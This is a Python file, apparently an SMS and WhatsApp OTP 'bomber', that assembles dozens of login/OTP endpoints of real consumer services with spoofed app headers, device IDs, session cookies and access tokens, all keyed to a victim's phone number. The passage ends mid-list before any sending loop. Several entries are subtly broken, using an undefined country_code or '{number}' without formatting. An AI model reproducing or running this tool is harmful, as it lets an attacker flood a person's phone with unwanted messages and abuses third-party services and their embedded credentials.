import requests
import json
import time 
def smsg(number):
    number = str(number)
    
    # List of APIs with their corresponding URLs and payloads
    apis = [
        
       
        {
            "url": "https://serviceacc.adani.com/customerportal-webservices/controller/userRegistrationService/sendOTPForNewUser",
            "method": "POST",
            "headers": {
                "Host": "serviceacc.adani.com",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-E5260 Build/UP1A.231005.007)"
            },
            "data": {
                "companyId": "1",
                "mobileNumber": number
            }
        },
        {
            "method": "POST",
            "url": "https://api.onsiteteams.in/apis/v3/register",
            "headers": {
                "Host": "api.onsiteteams.in",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.14.9"
            },
            "data": json.dumps({
                "country_code": "91",
                "mobile": number,
                "name": ""
            })
        },
        # Onsite Teams - Send WhatsApp OTP API
        {
            "method": "POST",
            "url": "https://api.onsiteteams.in/apis/v3/send-whatsapp-otp",
            "headers": {
                "Host": "api.onsiteteams.in",
                "authorization": "",  # Add your authorization token here if needed
                "version-code": "227",
                "version-name": "12.15.1",
                "package-name": "com.app.onsite",
                "user-agent": "Onsite",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip"
            },
            "data": json.dumps({
                "country_code": "91",
                "mobile": number
            })
        },
        {
            "url": "https://t.rummycircle.com/api/fl/auth/v3/getOtp",
            "method": "POST",
            "headers": {
                "content-type": "application/json"
            },
            "data": {
                "mobile": number,
                "deviceId": "f4ef81aa-b1a6-4840-99ef-4288a8b10e25",
                "deviceName": "",
                "refCode": "",
                "isPlaycircle": False
            }
        },
        {
            "url": "https://m.snapdeal.com/sendOTP",
            "method": "POST",
            "headers": {
                "content-type": "application/json"
            },
            "data": {
                "mobileNumber": number,
                "purpose": "LOGIN_WITH_MOBILE_OTP"
            }
        },
        
        {
            "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
            "method": "POST",
            "headers": {
                "content-type": "application/json",
                "accept": "application/json"
            },
            "data": {
                "country_code": "91",
                "locale": "IN",
                "mobile": number
            }
        },
        {
            "method": "GET",
            "url": "https://api.pocketnovel.com/v2/user_api/user.send_otp",
            "headers": {
                "Host": "api.pocketnovel.com",
                "ad-id": "d3ee50e2-c6ac-4ac5-9c14-6aff6b41c785",
                "version-name": "1.7.6",
                "region-code": "UP",
                "client-ts": "1714841716413",
                "which-app": "com.pocketfm.novel",
                "is-headset": "false",
                "device-create-time": "1714841706",
                "locale": "IN",
                "device-id": "c7abc1fd7459e84c",
                "platform": "android",
                "user-tg": "google-play",
                "content-ln": "hi",
                "app-name": "pocket_novel",
                "auth-token": "03971f2055de19233bcb54434a22d21fadaeb6bb",
                "content-type": "application/json;charset=utf-8",
                "screen-density": "1080px",
                "app-client": "consumer-android",
                "accept": "application/json",
                "app-version": "647",
                "ip-address": "192.0.0.8",
                "is-fg": "true",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.12.0"
            },
            "params": {
                "phone_number": f"+91{number}",
                "country_code": "+91",
                "channel": ""
            }
        },
        {
            "method": "POST",
            "url": "https://adminpanel.vdeliverz.com/api/v11/get-otp",
            "headers": {
                "Host": "adminpanel.vdeliverz.com",
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded"
            },
            "data": f"mobile=%2B91{number}"  # Formatted for x-www-form-urlencoded
        },
        {
            "url": "https://vyaparapp.in/resend/otp",
            "params": {"email": number, "country_code": "91"},
            "method": "GET",
            "headers": {
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip"}
        },
        {
            "url": f"https://jotp.jockey.in/api/login/send-otp/{number}?whatsapp=true",
            "method": "GET",
            "data": None,  # No payload needed for GET
            "headers": {}  # No additional headers required
        },
        # Jockey API - Resend OTP
        {
            "url": f"https://jotp.jockey.in/api/login/resend-otp/{number}?whatsapp=true",
            "method": "GET",
            "data": None,  # No payload needed for GET
            "headers": {}  # No additional headers required
        },
        # GoPinkCabs API
        {
            "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
            "method": "POST",
            "data": {
                "check_mobile_number": "1",
                "contact": number
            },
            "headers": {
                "Host": "www.gopinkcabs.com",
                "accept": "*/*",
                "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Android WebView\";v=\"128\"",
                "sec-ch-ua-platform": "\"Android\"",
                "x-requested-with": "XMLHttpRequest",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F9360 Build/UP1A.231005.007;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.146 Mobile Safari/537.36",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.gopinkcabs.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.gopinkcabs.com/app/cab/customer/step1.php",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
                "cookie": "previous_timestamp_val=1726811321690; mylocation=27.3337232,79.5545487; PHPSESSID=ir6t7ol3a03ufhbdklu297fm7h",
                "priority": "u=1, i"
            }
        },
        # Rappi API
        {
            "url": "https://services.rappi.com.br/api/rappi-authentication/login/whatsapp/create",
            "method": "POST",
            "data": {
                "country_code": country_code,
                "phone": number
            },
            "headers": {
                "Content-Type": "application/json"
            }
        },
        # KukuFM API
        {
            "url": "https://kukufm.com/api/v1/users/auth/send-otp/",
            "method": "POST",
            "data": {
                "phone_number": country_code + number
            },
            "headers": {
                "Content-Type": "application/json"
            }
        },
        {
            "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput",
            "params": {"mobileNumber": number},
            "method": "GET",
            "headers": {
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip"}
        },
        {
            "method": "POST",
            "url": 'https://cst.brevistay.com/app-api/login',
            "headers": {
                'Host': 'cst.brevistay.com',
                'brevi-channel': 'ANDROID',
                'brevi-channel-version': '5.4.1',
                'Content-Type': 'application/json; charset=UTF-8',
                'Accept-Encoding': 'gzip',
                'User-Agent': 'okhttp/4.9.1',
            },
            "data": {
                "is_otp": 1,
                "is_password": 0,
                "mobile": number,
                "otp": 123456,  # You may adjust this value as needed
                "password": ""
            }
        },
        {
            "url": 'https://prod.api.cosmofeed.com/api/user/authenticate',
            "method": "POST",
            "data": {
                'phoneNumber': number,
                'countryCode': '+91',
            },
            "headers": {
                'Host': 'prod.api.cosmofeed.com',
                'Accept': 'application/json, text/plain, */*',
                'Cosmofeed-Request-ID': 'e6491e02-b028-44d2-baba-d19ee35590d0',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36',
                'Content-Type': 'application/json',
                'Origin': 'https://cosmofeed.com',
                'X-Requested-With': 'pure.lite.browser',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://cosmofeed.com/',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
            }
        },
        {
            "url": "https://entri.app/api/v3/users/check-phone/",
            "method": "POST",
            "data": {'phone': '+91' + number},
            "headers": {
                'Host': 'entri.app',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'Client': 'web',
                'User-Language': 'hi',
                'Content-Type': 'application/json',
                'Origin': 'https://webapp.entri.app',
                'X-Requested-With': 'pure.lite.browser',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://webapp.entri.app/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
            }
        },
        {
            "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
            "method": "POST",
            "data": {'mobile_number': number},
            "headers": {
                'Host': 'hyuga-auth-service.pratech.live',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'Content-Type': 'application/json',
                'Origin': 'https://hyugalife.com',
                'X-Requested-With': 'pure.lite.browser',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://hyugalife.com/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
            }
        },
        
        
        {
            "url": f"https://www.jiomart.com/mst/rest/v1/session/initiate/using_mobileno_n_otp?mobile_no={number}",
            "method": "GET",
            "headers": {
                'Host': 'www.jiomart.com',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'X-Requested-With': 'pure.lite.browser',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://www.jiomart.com/customer/account/login',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
            }
        },
        {
            "url": "https://webapi.magicpin.in/ultron-onboarding/merchant/sendOtpWithMessage",
            "method": "POST",
            "data": {
                "phone": number,
                "message": "login",
                "appVersion": 30207
            },
            "headers": {
                "Host": "webapi.magicpin.in",
                "version-code": "30207",
                "version-name": "MAGICPINPARTNER0.7.6",
                "accept-encoding": "gzip",
                "client": "android",
                "content-type": "application/json",
               # "content-length": str(len(json.dumps(data))),
                "user-agent": "okhttp/3.12.12"
            }
        },
        {
            "url": 'https://v2api.medbuzz.in/app/Generate_User_OTP',
            "headers": {
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                # Add other headers as needed
            },
            "method": "POST",
            "data": {
                "DeviceID": "10cfa12bd7ccb9b4",
                "ApiKey": "0d064a14-959c-40b5-9089-07629d97bc39",
                "CountryCode": "91",
                "PhoneNumber": number
            }
        },
        {
            "url": 'https://www.beatxp.com/api-build/sendOTP',
            "headers": {
                "Host": "www.beatxp.com",
                "Content-Type": "application/json",
                # Add other headers as needed
            },
            "method": "POST",
            "data": {
                "number": number
            }
        },
        {
            "url": f'https://abmeat.com/client/login/{number}/6436',
            "headers": {
                'Host': 'abmeat.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://abmeat.com/order/ab-meat-mehdipatnam-hyderabad',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-IN,en-US;q=0.9,en;q=0.8',
            },
            "method": "GET",
            "params": {},
            "cookies": {
                'PHPSESSID': '1u68bgu21c9mddmu3vm954600c',
                'ci_session': 'a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%229236f4b6633be68624660e7fd97539b2%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A13%3A%22132.154.1.229%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0+%28Linux%3B+Android+13%3B+SM-A235F+Build%2FTP1A.220624.014%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Chrom%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1703254490%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D1dab7d1069b8faa936f67052b7ad55b7',
                'view_outlet': 'Hyderabad',
                'view_business': '6439',
                'slug': 'ab-meat-mehdipatnam-hyderabad',
                'view_locality': 'Mehdipatnam',
                '_ga': 'GA1.1.729356824.1703254492',
                '_ga_RS6GJ805M5': 'GS1.1.1703254499.1.0.1703254499.0.0.0',
                '_ga_X47KM2JJB4': 'GS1.1.1703254491.1.1.1703254500.0.0.0',
            }
        },
        {
            "url": "https://jsso.indiatimes.com/sso/crossapp/identity/web/getLoginOtp",
            "method": "POST",
            "headers": {
                "Host": "jsso.indiatimes.com",
                "content-length": str(len(str(number))),
                "captchatoken": "",
                "csrftoken": "",
                "sdkversion": "0.7.2",
                "user-agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
                "content-type": "application/json",
                "isjssocrosswalk": "true",
                "channel": "timesprime",
                "platform": "WAP",
                "ssec": "",
                "csut": "",
                "gdpr": "",
                "accept": "*/*",
                "origin": "https://www.timesprime.com",
                "x-requested-with": "pure.lite.browser",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.timesprime.com/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
                "cookie": "deviceid=4qk52ej5h7utmufbjxgvw9dhe; lgc_deviceid=4qk52ej5h7utmufbjxgvw9dhe",
            },
            "data": {
                "mobile": number
            }
        },
        {
            "method": "GET",
            "url": f"https://webapp.smartcoin.co.in/users/null/otpVerification/requestOtp/REGISTRATION/SMS?phoneNumber={number}&name=null&device_id=null&android_id=c7abc1fd7459e84c&rooted=0&locale=en&app_instance_id=null&google_ad_id=d3ee50e2-c6ac-4ac5-9c14-6aff6b41c785&app_store_key=google_play_store&fcm_token=f_u1nGSLRQ2c2Cw_ZhmvpP:APA91bHQCmiwzyRb8-QHmVN16n6-jjFC8lxp_sz1c91l4-1_6osymmD2ZLWcGkXAodp99QUr6DocUFBdZs0kGanjToDUxNCDlRxGKpj7qG9pklXloBNVhHdCo4FsN7YjZFbLVYn5AdtW&fb_ref=null&utm_source=client_unknown&utm_campaign=client_unknown&app_version=562&id_token=null&phone_number={number}",
            "headers": {
                "Host": "webapp.smartcoin.co.in",
                "checksum": "lqgvB2F18Gqk5QYTk+m5uw==",
                "request_id": "null1722769745692",
                "user-agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "accept-encoding": "gzip"
            },
        },
        {
            "method": "POST",
            "url": "https://be-prod-v1.onemuthoot.com/api/v1/om/notifications/otps?androidAppVersionCode=219",
            "headers": {
                "Host": "be-prod-v1.onemuthoot.com",
                "om-request-source": "MFL_ONE_ANDROID_APP",
                "content-type": "application/json; charset=UTF-8",
                "content-length": "38",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": f'{{"recipientMobileNumber":"{number}"}}'
        },
        {
            "method": "POST",
            "url": "https://www.gimbooks.com/v4/account/auth/get-otp/",
            "headers": {
                "Host": "www.gimbooks.com",
                "content-type": "application/x-www-form-urlencoded",
                "content-length": "16",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": f"phone={number}"
        },
        
        {
            "method": "POST",
            "url": "https://api.battameez.com/api/v1.0/loginWithOtp",
            "headers": {
                "User-Agent": "Android",
                "Accept-Encoding": "gzip",
                "signature": "kWVK7yyA9i7NWo9tJpl6ZpZYvsk=",
                "Content-Type": "application/json",
                "Host": "api.battameez.com",
                "Connection": "Keep-Alive",
                "Content-Length": "53"
            },
            "data": f'{{"phoneNumber":"+91-{number}","platform":"Android"}}'
        },
        {
            "method": "POST",
            "url": f"https://api2.feelapp.in/i/api/v1/otp/send/new/cdiOpn?mobileNumber={number}",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "api2.feelapp.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Length": "0"
            },
            "data": ""
        },
        {
            "method": "POST",
            "url": f"https://gway.atrangii.in/r/api/v1/otp/send/new/cdiOpn?mobileNumber={number}",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "gway.atrangii.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Length": "0"
            },
            "data": ""
        },
        
        {
            "method": "POST",
            "url": "https://dishtv-api.revlet.net/service/api/auth/signup/validate",
            "headers": {
                "Host": "dishtv-api.revlet.net",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.6",
                "box-id": "c7abc1fd7459e84c",
                "tenant-code": "dishtv",
                "session-id": "78ce486d-a978-430b-8d75-2c62fe7789b5"
            },
            "data": '{"password":"dishtv@123#","mobile":"91{number}","referral_type":"","referral_id":"","cookie":"","additional_params":{"isOptedForPromotions":"true"},"is_header_enrichment":false,"os_version":"14","app_version":"9.6.5","manufacturer":"SM-F7110"}'
        },
        {
            "method": "POST",
            "url": f"https://lgi-api-prod.aws.playco.com/api/v0.2/mobile/verify/91{number}/signup?lang=en&repeat=false",
            "headers": {
                "Host": "lgi-api-prod.aws.playco.com",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "Lionsgate Play/StarzAPP(com.lionsgateplay.videoapp;build:3090;Android:14)",
                "accept": "application/json",
                "client-type": "Android",
                "x-tracker-id": "1722785333194-9062802462019571687",
                "x-app-ad-id": "d3ee50e2-c6ac-4ac5-9c14-6aff6b41c785"
            },
            "data": '{"type":"signUp"}'
        },
        {
            "method": "POST",
            "url": "https://userapiprod-njsapi.epicon.in/users/sendOTP",
            "headers": {
                "Host": "userapiprod-njsapi.epicon.in",
                "x-access-auth-token": "tkLkjzlYe876feNbkfbTeEVgkG9VgH7Y",
                "user-agent": "samsung SM-F7110|c7abc1fd7459e84c",
                "x_country": "IN",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip"
            },
            "data": '{"otp":"","user_agent":"samsung SM-F7110|c7abc1fd7459e84c","user_id":"91{number}","user_signup_method":"MOBILE"}'
        },
        {
            "method": "POST",
            "url": "https://one.clear.in/api/auth/send-otp",
            "headers": {
                "Host": "one.clear.in",
                "accept": "application/json, text/plain, */*",
                "x-platform": "android",
                "x-app-version": "52",
                "x-request-id": "ecdf9d8a-5e73-46f0-ab00-35a46fe3eaf5",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.10"
            },
            "data": f'{{"phoneNumber":"{number}"}}'
        },
        {
            "method": "POST",
            "url": "https://jsso1.indiatimes.com/sso/crossapp/identity/native/getLoginOtp",
            "headers": {
                "appVersion": "8.46.1",
                "channel": "gaana.com",
                "keyId": "YSJK56KL3JBAPB",
                "appVersionCode": "1136",
                "deviceId": "elxlivxs3bb5mwidepgwqr2ap",
                "platform": "android",
                "sdkVersionCode": "3",
                "CONTENT_TYPE": "application/json",
                "checksum": "kt1RgDWtlElTVddl6EjR2bNJ6F7bb77OcXuZdAKzz1o=",
                "tgid": "elxlivxs3bb5mwidepgwqr2ap",
                "sdkVersion": "3.0.17.14",
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "jsso1.indiatimes.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            },
            "data": {"mobile":"+91-{number}","email":""}
        },
        {
            "method": "GET",
            "url": f"https://auth-api.salaryboxapp.com/auth/otp/login?pn={number}&dc=91",
            "headers": {
                "Host": "auth-api.salaryboxapp.com",
                "app-version-code": "477",
                "client-platform": "Android",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.8.0"
            }
        },
       
        {
            "method": "GET",
            "url": "https://sso.amarujala.com/v2/auth/nkit/sendotp?country_code=91&mobile={number}&platform=Android&hash=OTE5MzM2NzM0NDQy",
            "headers": {
                "Host": "sso.amarujala.com",
                "clientkey": "5822f190b5164f16380b32a9",
                "propertykey": "5822f190b5164f16380b32aa",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            }
        },
        {
            "method": "POST",
            "url": "https://tootoo.in/graphql",
            "headers": {
                "accept": "*/*",
                "authorization": "",
                "source": "android",
                "app-version": "3.5",
                "Content-Type": "application/json",
                "User-Agent": "okhttp/4.9.2"
            },
            "json": {
                "operationName": "sendOtp",
                "variables": {"mobile_no": number, "resend": 0},
                "query": """
                    query sendOtp($mobile_no: String!, $resend: Int!) {
                        sendOtp(mobile_no: $mobile_no, resend: $resend) {
                            success
                            __typename
                        }
                    }
                """
            }
        },
        {
            "method": "POST",
            "url": "https://www.beyoung.in/api/sendOtp.json",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "expires": "0",
                "device": "app",
                "platform": "android",
                "platform-version": "34",
                "app-version": "8.0.4",
                "access-token": "zUCRF0NUX+PmeRrqGIOGf/bZgYvqLip3mzP3Ob6Qnc0kKoAsPEi6UXHz+llcPD+fbZF0AiEuZpNXbC7CPp4iBg==",
                "content-type": "application/json",
                "user-agent": "okhttp/4.9.2"
            },
            "json": {
                "username": number,
                "username_type": "mobile",
                "service_type": 0,
                "vid": "1615332024275743"
            }
        },
        {
            "method": "POST",
            "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.6",
            "headers": {
                "x-app-id": "0c460f69-1df3-4826-9f65-7c92ef89aa93",
                "x-app-version": "3.0.6",
                "x-user-journey-id": "f9ba697f-e1b3-4850-b217-8e58d7c23f7d",
                "content-type": "application/json; charset=UTF-8",
                "user-agent": "okhttp/5.0.0-alpha.11"
            },
            "json": {
                "phone_number": {
                    "country_code": "+91",
                    "number": number
                }
            }
        },
        {
            "method": "POST",
            "url": "https://api.kiranafriends.com/v4/authenticate?language=En",
            "headers": {
                "Authorization": "bearer",
                "Content-Type": "application/json",
                "User-Agent": "okhttp/4.8.0"
            },
            "json": {
                "app_version": "8.0",
                "device_model": "samsung SM-F7110",
                "isFromTruecaller": False,
                "is_message_send": False,
                "language": "En",
                "mobile_no": number,
                "os_version": "14",
                "platform": "Android",
                "whatsapp_opted_in": True
            }
        },
        {
            "method": "POST",
            "url": "https://api.turftown.in/api/v2/user/send_otp",
            "headers": {
                "Host": "api.turftown.in",
                "accept": "application/json, text/plain, */*",
                "access-control-allow-origin": "*",
                "x-access-token": "",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.12"
            },
            "data": {"phone": number}
        },
        {
            "method": "POST",
            "url": "https://animall.in/zap/auth/login",
            "headers": {
                "Host": "animall.in",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.11"
            },
            "data": {"phone": number, "signupPlatform": "NATIVE_ANDROID"}
        },
        {
            "method": "POST",
            "url": "https://api.charzer.com/auth-service/send-otp",
            "headers": {
                "Host": "api.charzer.com",
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {"appSource": "CHARZER_APP", "mobileNumber": number}
        },
        {
            "method": "POST",
            "url": "https://mobile-api.thirdwavecoffee.in/api/v1/sendOTP",
            "headers": {
                "Host": "mobile-api.thirdwavecoffee.in",
                "access_token": "",
                "version": "2.5.11",
                "devicetype": "android",
                "package_name": "in.thirdwavecoffee.android",
                "user_preferences": "",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {"phoneNumber": number}
        },
        {
            "method": "POST",
            "url": "https://docon.co.in/api/v1/user/online-login",
            "headers": {
                "Host": "docon.co.in",
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "content-length": "29",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.2.1"
            },
            "data": {
                "mobileNumber": number
            }
        },
        {
            "url": "https://services.mxgrability.rappi.com/api/twilio-auth/verification-code/v2/send",
            "method": "POST",
            "headers": {
                "Host": "services.mxgrability.rappi.com",
                "content-type": "application/json; charset=utf-8",
                "content-length": "69",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "country_code": "+91",
                "phone": number,
                "locale": "es",
                "via": "sms"
            }
        },
        {
            "url": "https://nfapi.naturefit.in/api/auth/localsignup",
            "method": "POST",
            "headers": {
                "user-agent": "Dart/3.0 (dart:io)",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "content-length": "76",
                "host": "nfapi.naturefit.in"
            },
            "data": {"mobile": number, "email": None, "otp": None, "doctor_reference_code": None}
        },
        {
            "url": "https://api.beepkart.com/user/api/v2/login/public/send-otp",
            "method": "POST",
            "headers": {
                "Host": "api.beepkart.com",
                "authorization": "Bearer",
                "originid": "1234",
                "userid": "0",
                "changesorigin": "customerAppLogin",
                "appname": "CustomerAppAndroid_V2",
                "appversion": "2.0.28",
                "appversioncode": "20028",
                "cityid": "",
                "sessionid": "4f669469-b4c1-4d89-b0c7-8c43dcc0688e",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.3"
            },
            "data": {
                "blockNotification": False,
                "city": 362,
                "consent": True,
                "phone": number,
                "sessionInfo": {
                    "deviceInfo": {
                        "deviceRawString": "device_token=236c2d3b-ec6e-43d8-8cd0-31b79cd3dbb4; mobile=CustomerAppAndroid_V2; versionCode=20028; versionName=2.0.28; os_version=14; deviceManufacturer=samsung; model=SM-F7110"
                    },
                    "sessionId": "4f669469-b4c1-4d89-b0c7-8c43dcc0688e",
                    "sessionRawString": "utm_source=google-play&utm_medium=organic"
                },
                "source": "myaccount"
            }
        },
        {
            "url": "https://charge.tracking.blucharge.net/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {
                "Host": "charge.tracking.blucharge.net",
                "authorization": "Bearer",
                "refresh_token": "",
                "appversion": "3007",
                "platform": "ANDROID",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {"phone": number}
        },
        {
            "url": "https://www.nykaafashion.com/webscripts/api/otp/generate",
            "method": "POST",
            "headers": {
                "Host": "www.nykaafashion.com",
                "platform": "Android",
                "build": "11671",
                "version": "2.6.7",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {"customer_mobile": number}
        },
        {
            "method": "POST",
            "url": "https://anubhutiapis.channel-dss-r1-anubhuti-prod-vpn.ap.e06.c01.johndeerecloud.com/api/registration/resendOTPOnMobile",
            "headers": {
                "Authorization": "Bearer gAAAAABlOOZpZ-GfE6L5AfLC6fmtqNDJXWnyIZR",
                "LanguageCulture": "en-US",
                "Content-Type": "application/json; charset=utf-8",
                "ADRUM_1": "isMobile:true",
                "ADRUM": "isAjax:true",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "anubhutiapis.channel-dss-r1-anubhuti-prod-vpn.ap.e06.c01.johndeerecloud.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Length": "41"
            },
            "data": {
                "isExist": False,
                "MobileNo": number
            }
        },
        {
            "method": "POST",
            "url": "https://thanos.faasos.io/v3/customer/generate_otp.json?client_os=behrouz_android&app_version=10260&device_id=c7abc1fd7459e84c",
            "headers": {
                "Host": "thanos.faasos.io",
                "client-source": "13",
                "brand-id": "8",
                "app-version": "10260",
                "client-os": "behrouz_android",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.10.0"
            },
            "data": {
                "phone_number": number,
                "country_code": "IND",
                "dialing_code": "+91",
                "is_new_customer": True,
                "communication_channel": "whatsapp"
            }
        },
        
        {
            "method": "POST",
            "url": "https://mybillbook.in/api/request_otp",
            "headers": {
                "Host": "mybillbook.in",
                "authorization": "Bearer",
                "device-id": "c7abc1fd7459e84c",
                "client": "android",
                "accept": "application/json",
                "company-id": "",
                "language": "english",
                "client-version": "299",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.12.0"
            },
            "data": {
                "mobile_number": number,
                "otp_channel": "whatsapp"
            }
        },
        {
            "url": "https://www.gimbooks.com/v4/account/auth/get-otp/",
            "method": "POST",
            "headers": {
                "Host": "www.gimbooks.com",
                "content-type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.8.0"
            },
            "data": {
                "phone": number
            }
        },
        
        {
            "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            "method": "POST",
            "headers": {
                "Host": "api-gateway.juno.lenskart.com",
                "x-country-code-override": "IN",
                "accept-language": "en",
                "x-session-token": "ba761dad-180a-4dd5-b193-ef1c2e1bd142",
                "appversion": "4.2.6 (240405001)",
